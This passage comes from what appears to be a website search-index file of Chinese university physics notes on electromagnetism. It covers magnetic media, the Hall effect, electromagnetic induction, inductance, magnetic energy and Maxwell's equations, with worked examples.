\\frac{e^2}{4}\\sqrt{\\frac{r}{\\pi \\varepsilon_0 m_e}}\\] <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7ebf\u5708\u53d7\u5230\u78c1\u573a\u7684\u529b\u77e9\u4e3a\uff1a</p> \\[ dM=r\\times (Idl\\times B) \\] <p>\u5728\u5747\u5300\u78c1\u573a\u4e2d\uff0c\u7ebf\u5708\u53d7\u5230\u7684\u529b\u77e9\u53ef\u4ee5\u7528\u4e0b\u5217\u516c\u5f0f\u8ba1\u7b97\uff1a</p> \\[ M=p_m\\times B \\] <p>\u4e00\u4e2a\u4efb\u610f\u7684\u95ed\u5408\u8f7d\u6d41\u56de\u8def\uff0c\u5728\u78c1\u573a\u4e2d\u6539\u53d8\u4f4d\u7f6e\u6216\u5f62\u72b6\uff0c\u78c1\u529b\u6216\u78c1\u529b\u77e9\u505a\u529f\u4e3a\u7535\u6d41\u5927\u5c0f\u4e0e\u78c1\u901a\u91cf\u53d8\u5316\u91cf\u7684\u4e58\u79ef\uff1a</p> \\[ dA=Id\\phi \\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_12","title":"\u5e73\u884c\u957f\u76f4\u5bfc\u7ebf\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u529b","text":"<p>\u7701\u6d41\uff1a</p> \\[dF_{21} = \\frac{\\mu_0}{2\\pi}\\frac{ I_1 I_2}{d}\\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_13","title":"\u970d\u5c14\u6548\u5e94","text":"<p>\u5904\u5728\u5747\u5300\u78c1\u573a\u4e2d\u7684\u901a\u7535\u5bfc\u4f53\u8584\u677f\uff0c\u5f53\u7535\u6d41\u65b9\u5411\u4e0e\u78c1\u573a\u65b9\u5411\u5782\u76f4\u65f6\uff0c\u5219\u5728\u5782\u76f4\u4e8e\u78c1\u573a\u548c\u7535\u6d41\u65b9\u5411\u7684\u8584\u677f\u4e0a\u3001\u4e0b\u4e24\u7aef\u4e4b\u95f4\u51fa\u73b0\u7535\u52bf\u5dee\u3002</p> <p></p> <p>\u5b9a\u4e49\u970d\u5c14\u6548\u5e94\u4ea7\u751f\u7684\u7535\u538b\u4e3a\u970d\u5c14\u7535\u538b\uff1a</p> <p>$$ U_H = R_H \\frac{BI}{d}, R_H=\\frac{1}{nq} $$ \u5176\u4e2d \\(d\\) \u4e3a\u8584\u677f\u539a\u5ea6\uff0c\\(n\\) \u4e3a\u8f7d\u6d41\u5b50\u6d53\u5ea6\u3002</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_14","title":"\u78c1\u573a\u4e2d\u7684\u78c1\u4ecb\u8d28","text":""},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_15","title":"\u76f8\u5173\u6982\u5ff5","text":"<p>\u5728\u78c1\u4ecb\u8d28\u5904\u4e8e\u5916\u78c1\u573a\u65f6\uff0c\u5176\u4ea7\u751f\u4e0e\u5916\u78c1\u573a\u65b9\u5411\u76f8\u53cd\u7684\u9644\u52a0\u78c1\u77e9 \\(\\Delta p_m\\) </p> <p>\u78c1\u4ecb\u8d28\u7684\u5206\u5b50\u91cc\u73af\u6d41\u7740\u4e00\u79cd\u5706\u7535\u6d41\uff0c\u5373\u5206\u5b50\u7535\u6d41\uff0c\u5176\u4ea7\u751f\u7684\u78c1\u77e9\u79f0\u4e3a\u5206\u5b50\u78c1\u77e9\u3002\u5728\u6ca1\u6709\u5916\u78c1\u573a\u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4e8e\u5404\u4e2a\u5206\u5b50\u7684\u53d6\u5411\u6742\u4e71\uff0c\u78c1\u4ecb\u8d28\u7684\u5408\u78c1\u77e9\u4e3a\u96f6\uff0c\u4ea7\u751f\u7684\u78c1\u573a\u4e5f\u5c31\u7b49\u4e8e\u96f6\uff1b\u5728\u5916\u78c1\u573a\u4f5c\u7528\u4e0b\uff0c\u5404\u4e2a\u5206\u5b50\u78c1\u77e9\u5728\u5916\u78c1\u573a\u65b9\u5411\u53d6\u5411\u6392\u5217\u8d8b\u5411\u6574\u9f50\uff0c\u78c1\u4ecb\u8d28\u78c1\u5316\uff0c\u56e0\u800c\u4ea7\u751f\u9644\u52a0\u78c1\u573a\u3002</p> <p>\u67d0\u5355\u4f4d\u4f53\u79ef\u5fae\u5143 \\(\\Delta V\\) \u5185\u5206\u5b50\u603b\u78c1\u77e9\u4e4b\u548c\u5b9a\u4e49\u4e3a\u78c1\u4ecb\u8d28\u7684\u78c1\u5316\u5f3a\u5ea6\uff1a</p> \\[ M=\\sum p_m / \\Delta V\\] <ul> <li>\u987a\u78c1\u8d28\u7684 \\(p_m\\) \u8fdc\u5927\u4e8e \\(\\Delta p_m\\) \uff0c\u5176\u78c1\u5316\u5f3a\u5ea6\u4e0e \\(B_0\\) \u540c\u5411</li> <li>\u6297\u78c1\u8d28\u7684 \\(p_m\\) \u4e3a 0\uff0c\u9644\u52a0\u78c1\u77e9\u662f\u4ea7\u751f\u78c1\u5316\u7684\u552f\u4e00\u539f\u56e0\uff0c\u5176\u78c1\u5316\u5f3a\u5ea6\u4e0e \\(B_0\\) \u53cd\u5411</li> </ul> <p>\u78c1\u4ecb\u8d28\u5185\u5404\u5206\u5b50\u7684\u5206\u5b50\u7535\u6d41\u53e0\u52a0\uff0c\u4ec5\u5728\u78c1\u4ecb\u8d28\u8868\u9762\u4ea7\u751f\u7b49\u6548\u7684\u73af\u5f62\u7535\u6d41\u3002\u78c1\u4ecb\u8d28\u8868\u9762\u67d0\u5904\u78c1\u5316\u7535\u6d41\u7ebf\u5bc6\u5ea6 \\(j_m\\) \u7b49\u4e8e\u8be5\u70b9\u78c1\u5316\u5f3a\u5ea6 \\(M\\) \u6cbf\u8868\u9762\u7684\u5207\u5411\u5206\u91cf\uff0c\u82e5\u662f\u5747\u5300\u78c1\u4ecb\u8d28\u88ab\u5747\u5300\u78c1\u5316\uff0c\u5219\uff1a</p> \\[j_m = |M|\\] <p>\u78c1\u5316\u5f3a\u5ea6 \\(M\\) \u5bf9\u95ed\u5408\u56de\u8def\u7684\u7ebf\u79ef\u5206\u7b49\u4e8e\u901a\u8fc7\u56de\u8def\u6240\u5305\u56f4\u7684\u675f\u7f1a\u7535\u6d41\u7684\u4ee3\u6570\u548c\uff1a</p> \\[ \\oint _L M\\cdot dl =\\sum I_m = j_m l \\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_16","title":"\u78c1\u4ecb\u8d28\u4e0b\u7684\u78c1\u573a\u5b9a\u7406","text":"<p>\u5b9a\u4e49\u78c1\u573a\u5f3a\u5ea6</p> \\[ H=\\frac{B}{\\mu _0} -M\\] <p>\u5728\u5404\u5411\u540c\u6027\u7684\u78c1\u4ecb\u8d28\u4e2d\uff0c\u78c1\u5316\u5f3a\u5ea6\u4e0e\u78c1\u573a\u5f3a\u5ea6\u6210\u6b63\u6bd4\uff0c\u6709\u57fa\u672c\u5173\u7cfb\u5982\u4e0b\uff1a</p> \\[ M=\\chi_m H \\Rightarrow B=\\mu_0 (1+\\chi_m) H = \\mu_0 \\mu H \\] <ul> <li>\\(\\chi_m\\) : \u78c1\u5316\u7387<ul> <li>\u987a\u78c1\u8d28\u4e3a\u6b63\uff0c\u6297\u78c1\u8d28\u4e3a\u8d1f(\u5373\uff0c\u6297\u78c1\u8d28\u7684 \\(\\mu_r \\lt 1\\))</li> <li>\u94c1\u78c1\u8d28\u78c1\u5316\u7387\u5f88\u5927\uff0c\u4e14\u4e0d\u662f\u6052\u91cf</li> </ul> </li> <li>\\(\\mu\\) : \u76f8\u5bf9\u78c1\u5bfc\u7387\uff0c\u7b80\u79f0\u78c1\u5bfc\u7387</li> </ul> <p>\u56e0\u6b64\u78c1\u4ecb\u8d28\u4e2d\u5b89\u57f9\u73af\u8def\u5b9a\u7406\u4e3a\uff1a</p> \\[ \\oint_L Hdl = \\sum I_0 \\ \\ \\ \\ \\text{(SI: A/m)} \\] <p>\u5176\u4e2d \\(I_0\\) \u4e3a\u7a7f\u8fc7\u56de\u8def \\(L\\) \u7684\u4f20\u5bfc\u7535\u6d41\uff0c\u4e0d\u5305\u62ec\u675f\u7f1a\u7535\u6d41\u3002</p> <p>\u641e\u6e05\u695a\u8c01\u662f\u8c01</p> <p></p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_17","title":"\u94c1\u78c1\u8d28 *","text":"<p>\u5728\u5927\u7269\u4e59\u4e2d\u4e0d\u8003\u5bdf</p> <p>\u94c1\u78c1\u8d28\u7684\u5bfc\u7535\u80fd\u529b\u8fdc\u5927\u4e8e\u987a\u78c1\u8d28\u548c\u6297\u78c1\u8d28\uff0c\u4e14\u4e0d\u540c\u4e8e\u5f31\u78c1\u6027\u7269\u8d28\uff08\u987a\u78c1\u8d28\u548c\u9006\u78c1\u8d28\uff09\u7684 \\(B-H\\) \u5173\u7cfb\u662f\u7ebf\u6027\u53d8\u5316\u7684\uff0c\u94c1\u78c1\u8d28\u7684\u78c1\u5316\u7387\u968f\u78c1\u573a\u53d8\u5316\u3002</p> <p>\u94c1\u78c1\u8d28\u78c1\u5316\u81f3\u9971\u548c\u72b6\u6001\u540e\uff0c\u51cf\u5c0f \\(H\\) \uff0c\\(B\\) \u7684\u51cf\u5c0f\u5448\u73b0\u6ede\u540e\u6027\uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u78c1\u6ede\u73b0\u8c61\u3002\u8fd9\u5bfc\u81f4\u5f53\u78c1\u573a\u5f3a\u5ea6 \\(H=0\\) \u65f6\uff0c\\(B\\ne 0\\) \uff0c\u9700\u8981\u4ee4 \\(H=-H_c\\) \u624d\u80fd\u4f7f \\(B=0\\) \uff0c\u78c1\u573a\u5f3a\u5ea6 \\(H_c\\) \u79f0\u4e3a\u77eb\u987d\u529b\uff0c\u53cd\u6620\u4e86\u94c1\u78c1\u8d28\u4fdd\u7559\u5269\u78c1\u7684\u80fd\u529b\u3002</p> <p>\u5b9e\u9a8c\u8868\u660e\uff0c\u94c1\u78c1\u8d28\u5728\u4ea4\u53d8\u78c1\u573a\u4f5c\u7528\u4e0b\u53cd\u590d\u78c1\u5316\u7684\u8fc7\u7a0b\u4f1a\u53d1\u70ed\uff0c\u4ece\u800c\u5f15\u8d77\u80fd\u91cf\u635f\u8017\u3002\u8fd9\u79cd\u80fd\u91cf\u635f\u5931\u79f0\u4e3a\u78c1\u6ede\u635f\u8017\u3002\u78c1\u6ede\u56de\u7ebf\u5305\u56f4\u7684\u9762\u79ef\u8d8a\u5927\uff0c\u78c1\u6ede\u635f\u8017\u4e5f\u8d8a\u5927\u3002</p> <p></p> \u94c1\u78c1\u8d28\u7684\u5206\u7c7b <ul> <li>\u8f6f\u78c1\u6750\u6599<ul> <li>\u8f6f\u78c1\u6750\u6599\u77eb\u987d\u529b\u8f83\u5c0f\uff0c\u78c1\u6ede\u56de\u7ebf\u72ed\u957f\uff0c\u4ece\u800c\u5728\u4ea4\u53d8\u78c1\u573a\u4e2d\u78c1\u6ede\u635f\u8017\u5c0f\uff0c\u9002\u5408\u7528\u4f5c\u5728\u4ea4\u53d8\u78c1\u573a\u4e2d\u4f7f\u7528\u7684\u7535\u5b50\u5143\u4ef6\u6750\u6599</li> </ul> </li> <li>\u786c\u78c1\u6750\u6599\uff08\u6c38\u78c1\u4f53\uff09<ul> <li>\u786c\u78c1\u6750\u6599\u77eb\u987d\u529b\u8f83\u5927\uff0c\u5f53\u5916\u52a0\u78c1\u573a\u6d88\u5931\uff08\\(H=0\\)\uff09\u540e\u4ecd\u7136\u4fdd\u6301\u8f83\u5f3a\u7684\u5269\u4f59\u78c1\u611f\u5e94\u5f3a\u5ea6</li> </ul> </li> </ul>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_18","title":"\u7535\u78c1\u611f\u5e94","text":"<p>\u7531\u78c1\u901a\u91cf\u53d8\u5316\u4ea7\u751f\u7684\u611f\u5e94\u7535\u52a8\u52bf\uff0c\u53ef\u5206\u4e3a\u78c1\u611f\u5e94\u5f3a\u5ea6\u53d8\u5316\u5f15\u8d77\u7684\u611f\u751f\u7535\u52a8\u52bf\uff0c\u548c\u5bfc\u4f53\u5728\u78c1\u573a\u4e2d\u8fd0\u52a8\u5f15\u8d77\u7684\u52a8\u751f\u7535\u52a8\u52bf\u3002</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_19","title":"\u611f\u751f\u7535\u52a8\u52bf","text":"<p>\u6cd5\u62c9\u7b2c\u7535\u78c1\u611f\u5e94\u5b9a\u5f8b\u6307\u51fa\uff0c\u56de\u8def\u4e2d\u5305\u56f4\u7684\u78c1\u901a\u91cf \\(\\Phi\\) \u53d1\u751f\u53d8\u5316\u65f6\uff0c\u56de\u8def\u4e2d\u4f1a\u4ea7\u751f\u611f\u5e94\u7535\u52a8\u52bf \\(\\varepsilon_i\\) \uff1a</p> \\[ \\varepsilon_i =- \\frac{d\\Phi}{dt} \\] <p>\u5176\u4e2d\uff0c\u8d1f\u53f7\u53cd\u6620\u4e86\u611f\u5e94\u7535\u52a8\u52bf\u7684\u65b9\u5411\uff0c\u89c4\u5b9a\u7535\u6d41\u56de\u8def\u4e0e\u539f\u78c1\u611f\u5e94\u5f3a\u5ea6\u65b9\u5411\u5448\u53f3\u624b\u87ba\u65cb\u5173\u7cfb\u65f6\u4e3a\u6b63\u3002</p> <p>\u5bf9\u4e8e N \u531d\u7ebf\u5708\uff0c\u603b\u611f\u5e94\u7535\u52a8\u52bf\u4e3a\u5168\u78c1\u901a \\(\\Psi\\) \u7684\u65f6\u95f4\u53d8\u5316\u7387\uff1a</p> \\[ \\varepsilon_i = - \\frac{d\\Psi}{dt}, \\text{\u5176\u4e2d }\\Psi = \\Phi_1 +\\Phi_2 +...+\\Phi_n \\] <p>\u695e\u6b21\u5b9a\u5f8b</p> <p>\u95ed\u5408\u56de\u8def\u4e2d\u611f\u5e94\u7535\u6d41\u7684\u65b9\u5411\uff0c\u603b\u662f\u4f7f\u5b83\u6240\u6fc0\u53d1\u51fa\u7684\u78c1\u573a\u53bb\u963b\u6b62\u5f15\u8d77\u611f\u5e94\u7535\u6d41\u7684\u539f\u78c1\u901a\u91cf\u7684\u53d8\u5316\u3002</p> <p>\u5bf9\u4e8e\u611f\u751f\u7535\u52a8\u52bf\uff0c\u8fd8\u6709\u91cd\u8981\u516c\u5f0f\uff1a</p> \\[\\varepsilon_i = \\oint _L E_i \\cdot dl\\] <p>\u8bfe\u672c\u4f8b\u9898</p> <p>\u5728\u534a\u5f84\u4e3a \\(r\\) \u7684\u5706\u67f1\u5f62\u7a7a\u95f4\u5185\u6709\u4e00\u968f\u65f6\u95f4\u4ee5 \\(\\frac{dB}{dt}\\) \u589e\u52a0\u7684\u5747\u5300\u78c1\u573a\uff0c\u6c42\u7a7a\u95f4\u5404\u5904\u7684\u6da1\u65cb\u7535\u573a\u573a\u5f3a\uff1a</p> \\[\\begin{array}c r\\lt R: \\Phi_B = B\\pi r^2 \\\\ \\oint E_{\u65cb}dl=E_{\u65cb}\\cdot 2\\pi r=- \\frac{d\\Phi_b}{dt}=-\\pi r^2 \\frac{dB}{dt} \\\\ \\Rightarrow E_{\u65cb}=-\\frac{1}{2}r \\frac{dB}{dt}\\end{array}\\] <p></p> <p>\u8bfe\u4ef6\u4f8b\u9898</p> <p>\u5728\u5706\u5f62\u53d8\u5316\u78c1\u573a\u5185\u653e\u7f6e\u4e00\u6839\u957f\u4e3a \\(L\\) \u7684\u7ec6\u68d2 ab\uff0c\u4e0e\u5706\u5fc3 o \u7684\u5782\u76f4\u8ddd\u79bb\u4e3a \\(h\\)\uff0c\u6c42\u68d2\u4e0a\u7684\u611f\u751f\u7535\u52a8\u52bf\uff1a</p> <p></p> <p>\u89e3\u6cd5\u4e00\uff1a\u5229\u7528 \\(d\\varepsilon = \\overrightarrow{E}\\cdot d\\overrightarrow{y}\\) \u79ef\u5206\u6c42\u89e3</p> <p>\u53d6\u534a\u5f84\u4e3a \\(r\\lt R\\) \u7684\u5706\u533a\u57df\uff0c\u7531\u4e8e\uff1a</p> \\[\\begin{array}c \\varepsilon =  \\iint \\frac{\\Delta B}{\\Delta t}dS = \\frac{dB}{dt}\\pi r^2 \\\\ \\varepsilon = \\oint E\\cdot dl = 2\\pi r\\cdot E   \\\\ E= \\frac{r}{2} \\frac{dB}{dt} \\end{array}\\] <p>\u5728\u68d2\u4e0a\u4efb\u53d6\u7ebf\u5143 \\(dy\\) \uff0c\u4e0e \\(E\\) \u7684\u5939\u89d2\u4e3a \\(\\theta\\) \uff0c\u5219\u611f\u751f\u7535\u52a8\u52bf\u4e3a\uff1a</p> \\[\\begin{array}c d\\varepsilon_i = \\overrightarrow{E}\\cdot d\\overrightarrow{y} =E\\cdot \\cos \\theta \\cdot dy = \\frac{h}{2} \\frac{dB}{dt} dy \\\\ \\varepsilon_i = \\int ^{\\frac{L}{2}}_{\\frac{-L}{2}} \\frac{h}{2} \\frac{dB}{dt} dy = \\frac{hL}{2} \\frac{dB}{dt} \\end{array} \\] <p>\u89e3\u6cd5\u4e8c\uff1a \u5229\u7528\u6cd5\u62c9\u7b2c\u7535\u78c1\u611f\u5e94\u5b9a\u5f8b</p> <p>\u4f5c\u8f85\u52a9\u7ebf oa,ob \u6784\u6210\u5047\u60f3\u56de\u8def obao\uff0c\u7531\u4e8e\u5728 oa,ob \u4e0a \\(E\\) \u5782\u76f4\u4e8e \\(dl\\) \uff0c\u6545\u5728\u8f85\u52a9\u7ebf\u4e0a\u611f\u751f\u7535\u52a8\u52bf\u4e3a\u96f6\uff0c\u5219\u6240\u6c42\u68d2\u7684\u611f\u751f\u7535\u52a8\u52bf\u7b49\u4e8e\u56de\u8def\u7684\u611f\u751f\u7535\u52a8\u52bf\uff0c\u5229\u7528\u5305\u56f4\u78c1\u901a\u91cf\u5173\u4e8e\u65f6\u95f4\u7684\u79ef\u5206\u6c42\u89e3\uff1a</p> \\[\\begin{array}c \\Phi =B\\cdot S =\\frac{1}{2}BhL  \\\\ \\varepsilon_i = \\frac{-d\\Phi}{dt} = \\frac{-hL}{2} \\frac{dB}{dt} \\end{array} \\] \u66f4\u591a\u8f85\u52a9\u7ebf\u4f8b\u5b50 <p></p> <p>\u4ea4\u6d41\u53d1\u7535\u673a</p> \\[\\begin{array}c\\Phi=BS\\cos \\omega t \\\\ \\Rightarrow \\varepsilon = -\\frac{d\\Phi}{dt}=BS\\omega \\sin \\omega t\\end{array}\\]"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_20","title":"\u52a8\u751f\u7535\u52a8\u52bf","text":"<p>\u5bf9\u4e8e\u7ebf\u5143 \\(dl\\) \uff0c\u5176\u4e0a\u4ea7\u751f\u7684\u52a8\u751f\u7535\u52a8\u52bf\uff1a</p> \\[\\begin{array}c d\\varepsilon_i =(v\\times B)\\cdot dl \\\\ \\Rightarrow \\varepsilon = \\int \uff08v\\times B)\\cdot dl \\end{array}\\] <p>\u5982\u679c\u662f\u7535\u5b50\u5728\u8fd0\u52a8\uff0c\u5224\u65ad\u529b\u7684\u65f6\u5019\u8981\u6ce8\u610f v \u53cd\u5411</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u957f \\(L\\) \u7684\u76f4\u5bfc\u7ebf\u4e0e\u78c1\u573a\u5782\u76f4\u7ed5\u4e00\u7aef\u8f6c\u52a8\uff0c\u4ea7\u751f\u7684\u7535\u52a8\u52bf\u4e3a\uff1a</p> \\[ \\varepsilon_i = \\frac{1}{2}B \\omega L^2 \\] <p>(20-21 \u671f\u672b)</p> <p>\u957f\u4e3a L \u7684\u5bfc\u4f53\u68d2 OP \u7ed5 OO' \u8f74\u4ee5\u89d2\u901f\u5ea6 \\(\\omega\\) \u65cb\u8f6c\uff0c\u68d2\u4e0e\u8f6c\u8f74\u5939\u89d2\u6052\u4e3a \\(\\theta\\)\uff0c\u6c42\u611f\u5e94\u7535\u52a8\u52bf\uff1a</p> \\[\\begin{array}c v=\\omega l \\sin \\theta \\\\ \\varepsilon =  \\int_0 ^ L  v\\times B dl \\sin \\theta = \\int_0 ^L \\omega \\sin^2\\theta B ldl = \\frac{1}{2}B\\omega L^2 \\sin^2\\theta\\end{array}\\] <p>\u5c0f\u6280\u5de7</p> <ul> <li>\u4e00\u6bb5\u975e\u76f4\u7ebf\u5bfc\u4f53\u5728\u78c1\u573a\u4e2d\u8f6c\u52a8\uff0c\u53ef\u4ee5\u53d6\u9996\u5c3e\u4f5c\u8f85\u52a9\u7ebf\u6784\u6210\u95ed\u5408\u56de\u8def\uff0c\u6c42\u8f85\u52a9\u7ebf\u7684\u611f\u751f\u7535\u52a8\u52bf\u5e76\u53d6\u53cd</li> <li>\u6216\u8005\u5c06\u5bfc\u4f53\u4e0e\u53e6\u4e00\u6bb5\u4e0d\u4ea7\u751f\u611f\u751f\u7535\u52a8\u52bf\u7684\u5047\u60f3\u5bfc\u4f53\u6784\u6210\u56de\u8def\uff0c\u5219\u6b64\u65f6\u56de\u8def\u7535\u52a8\u52bf\u5c31\u662f\u6240\u6c42\u7684\u5bfc\u4f53\u7684\u7535\u52a8\u52bf</li> </ul>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_21","title":"\u81ea\u611f\u548c\u4e92\u611f","text":"<p>\u7531\u4e8e\u56de\u8def\u7535\u6d41\u53d8\u5316\u5728\u56de\u8def\u81ea\u8eab\u4ea7\u751f\u611f\u5e94\u7535\u52a8\u52bf\uff0c\u6b64\u65f6\u901a\u8fc7\u56de\u8def\u7684\u5168\u78c1\u901a \\(\\Psi\\) \u4e0e\u7535\u6d41 \\(I\\) \u6210\u6b63\u6bd4\uff0c\u5219\u5b9a\u4e49\u81ea\u611f\u7cfb\u6570 \\(L\\) \u4e3a\uff1a</p> \\[ \\Psi = L\\cdot I \\] <p>\u81ea\u611f\u7535\u52a8\u52bf\u53ef\u8868\u793a\u4e3a\uff1a</p> <p>$$ \\varepsilon_i = -L \\frac{di}{dt} $$ \u56e0\u6b64\uff0c\u6c42\u81ea\u611f\u7cfb\u6570\u548c\u81ea\u611f\u7535\u52a8\u52bf\u7684\u4e00\u822c\u6b65\u9aa4\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; \u6839\u636e\u56de\u8def\u4e2d\u7684\u7535\u6d41 \\(I\\) \uff0c\u7b97\u51fa\u78c1\u573a\u5206\u5e03\uff0c\u7136\u540e\u7528 \\(L = \\frac{\\Psi}{I}\\) \u6c42\u51fa\u81ea\u611f\u7cfb\u6570</li> <li>&lt;2&gt; \u82e5\u6b64\u65f6\u901a\u6709\u968f\u65f6\u95f4\u53d8\u5316\u7684\u7535\u6d41 \\(i\\) \uff0c\u5219\u53ef\u6839\u636e \\(\\varepsilon_i = -L \\frac{di}{dt}\\) \u6c42\u51fa\u81ea\u611f\u7535\u52a8\u52bf</li> </ul> <p>\u5bc6\u7ed5\u87ba\u7ebf\u7ba1\u7684\u81ea\u611f\u7cfb\u6570</p> \\[\\begin{array}c B=\\mu_0 nI\\\\ \\Psi=N\\Phi_B=NBS= Sl\\mu_0n^2I\\\\ L=\\frac{\\Psi}{I}=\\mu_0 n^2lS= \\mu_0n^2 V\\end{array}\\] <p>\u5176\u4e2d \\(n=N/l\\) \u4e3a\u5355\u4f4d\u957f\u5ea6\u531d\u6570\uff1b\\(V=lS\\) \u662f\u87ba\u7ebf\u7ba1\u7684\u4f53\u79ef\u3002</p> <p>LR\u7535\u8def:</p> <ul> <li>\u7535\u8def\u63a5\u901a\u65f6\u7684\u7535\u6d41\uff1a \\(I= \\frac{\\varepsilon}{R}(1-e^{-\\frac{R}{L}t})\\)</li> <li>\u7535\u8def\u5207\u65ad\u65f6\u7684\u7535\u6d41\uff1a \\(I= \\frac{\\varepsilon}{R}e^{-\\frac{R}{L}t}\\)</li> </ul> <p>\u8bfe\u672c\u4f8b\u9898</p> <p></p> <p>\u4e00\u4e2a\u56de\u8def\u4e2d\u7684\u7535\u6d41\u53d8\u5316\u5728\u53e6\u4e00\u4e2a\u56de\u8def\u4ea7\u751f\u611f\u5e94\u7535\u52a8\u52bf\uff0c\u79f0\u4e3a\u4e92\u611f\u73b0\u8c61\u3002\u540c\u6837\u7684\uff0c\u6211\u4eec\u5b9a\u4e49\u4e92\u611f\u7cfb\u6570\uff1a</p> \\[ \\Psi _{21} =MI_1,\\ \\ \\Psi_{12} =MI_2 \\] <p>\u4e92\u611f\u7535\u52a8\u52bf\u53ef\u8868\u793a\u4e3a\uff1a</p> \\[ \\varepsilon_{21} = -M \\frac{dI_1}{dt} \\] <p>\u8bfe\u672c\u4f8b\u9898</p> \u9898\u9762\u7b54\u6848 <p>\u4e24\u4e2a\u5171\u8f74\u5706\u7ebf\u5708\u534a\u5f84\u5206\u522b\u4e3a \\(R,r\\) \uff0c\u531d\u6570\u5206\u522b\u4e3a \\(N_1, N_2\\) \uff0c\u4e8c\u8005\u76f8\u8ddd \\(d\\) \u3002\u8bbe \\(r\\) \u5f88\u5c0f\uff0c\u5219\u5c0f\u7ebf\u5708\u6240\u5728\u5904\u53ef\u89c6\u4e3a\u5747\u5300\u78c1\u573a\uff0c\u6c42\u4e92\u611f\u7cfb\u6570\u3002</p> <p></p> <p>\u8bbe\u534a\u5f84\u4e3a \\(R\\) \u7684\u5927\u7ebf\u5708\u6709\u7535\u6d41 \\(I\\) \u6d41\u8fc7\uff0c\u5219\u5176\u5728\u5c0f\u7ebf\u5708\u5904\u4ea7\u751f\u78c1\u573a\uff1a</p> \\[B=N_1 \\frac{\\mu_0}{2}\\frac{IR^2}{( R^2+d^2)^{3/2}}\\] <p>\u5219\u4e92\u611f\u7cfb\u6570\u4e3a\uff1a</p> \\[M=\\frac{\\Psi_{21}}{I} = \\frac{N_2BS_2}{I}=\\frac{ \\mu_0 \\pi N_1 N_2 R^2 r^2 I}{2(R^2 +d^2 )^{3/2}}\\] More Example <p></p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_22","title":"\u78c1\u573a\u80fd\u91cf","text":"<p>\u81ea\u611f\u7cfb\u6570\u4e3a \\(L\\) \u7684\u7ebf\u5708\u5efa\u7acb\u7a33\u5b9a\u7535\u6d41 \\(I_0\\) \u65f6\uff0c\u7ebf\u5708\u4e2d\u7684\u78c1\u573a\u80fd\u91cf\u4e3a\uff1a</p> \\[ W_m = \\frac{1}{2}L I_0 ^2 \\] <p>\u7c7b\u4f3c\u4e8e\u7535\u573a\u80fd\u91cf\u5bc6\u5ea6\uff0c\u6211\u4eec\u6709\u78c1\u80fd\u5bc6\u5ea6\u5b9a\u4e49\uff1a</p> \\[ \\omega _m = \\frac{1}{2} B\\cdot H \\] <p>\u5bf9 \\(dV\\) \u8fdb\u884c\u79ef\u5206\u5373\u53ef\u6c42\u5f97\u78c1\u573a\u80fd\u91cf\u3002</p>"},{"location":"Courses/Physics/PhysicsII/electromagnetism/#_23","title":"\u7535\u78c1\u573a\u4e0e\u7535\u78c1\u6ce2","text":"<p>\u9ea6\u514b\u65af\u97e6\u65b9\u7a0b\u7ec4\uff1a</p> \\[\\begin{array}c \\oint _S D\\cdot dS = \\int _V \\rho dV=\\sum q \\\\ \\\\ \\oint _L E\\cdot dl = - \\frac{d\\Phi_B}{dt} = -\\oint \\frac{\\partial B}{\\partial t} \\cdot dS \\\\ \\\\ \\oint _S B\\cdot dS =0 \\\\ \\\\ \\oint _L H\\cdot dl =\\sum {I} + \\frac{d\\Phi_D}{dt} =\\int_S j\\cdot dS +\\int_S \\frac{\\partial D}{\\partial t} \\cdot dS  \\end{array} \\] <p>\u5176\u4e2d\u5168\u7535\u6d41\u7b49\u4e8e\u4f20\u5bfc\u7535\u6d41\u548c\u4f4d\u79fb\u7535\u6d41\u4e4b\u548c\uff1a</p> \\[ I_{\u5168}=I+ I_D = \\oint_L H\\cdot dl \\] <p>\u901a\u8fc7\u67d0\u4e00\u622a\u9762\u7684\u4f4d\u79fb\u7535\u6d41\u7b49\u4e8e\u8be5\u622a\u9762\u7535\u4f4d\u79fb\u901a\u91cf\u968f\u65f6\u95f4\u7684\u53d8\u5316\u7387</p> \\[I_D= \\frac{d\\Phi_D}{dt}\\] <p>\u5e73\u884c\u677f\u7684\u4f4d\u79fb\u7535\u6d41</p> <p></p> More Example: \u6839\u636e\u5b89\u57f9\u73af\u8def\u5b9a\u7406\u6c42\u4f4d\u79fb\u7535\u6d41 <p></p> <p>\u632f\u8361\u7535\u5076\u6781\u5b50\u8f90\u5c04\u7684\u7535\u78c1\u6ce2\u5728\u8ddd\u79bb \\(r\\) \u8db3\u591f\u5927\u65f6\u662f\u7403\u9762\u6ce2\uff0c\u8fd9\u65f6\u6ce2\u7684\u632f\u5e45\u4e0e\u8ddd\u79bb \\(r\\) \u6210\u53cd\u6bd4\u3002\u4f46\u5728\u8fdc\u79bb\u632f\u8361\u7535\u5076\u6781\u5b50\u7684\u7a7a\u95f4\uff0c\u7535\u78c1\u6ce2\u53ef\u770b\u6210\u5e73\u9762\u6ce2\u3002\u4e0b\u9762\u662f\u81ea\u7531\u7a7a\u95f4\u4f20\u64ad\u7684\u7535\u78c1\u6ce2\u7684\u4e00\u4e9b\u666e\u904d\u6027\u8d28\uff1a</p> <ul> <li>&lt;1&gt; \u7535\u78c1\u6ce2\u662f\u6a2a\u6ce2\u3002\u7535\u78c1\u6ce2\u632f\u52a8\u7684\u7535\u77e2\u91cf \\(E\\) \u548c\u78c1\u77e2\u91cf \\(H\\) \u90fd\u4e0e\u4f20\u64ad\u65b9\u5411\u5782\u76f4\u3002</li> <li>&lt;2&gt; \u7535\u77e2\u91cf \\(E\\) \u548c\u78c1\u77e2\u91cf \\(H\\) \u76f8\u4e92\u5782\u76f4\u3002</li> <li>&lt;3&gt; 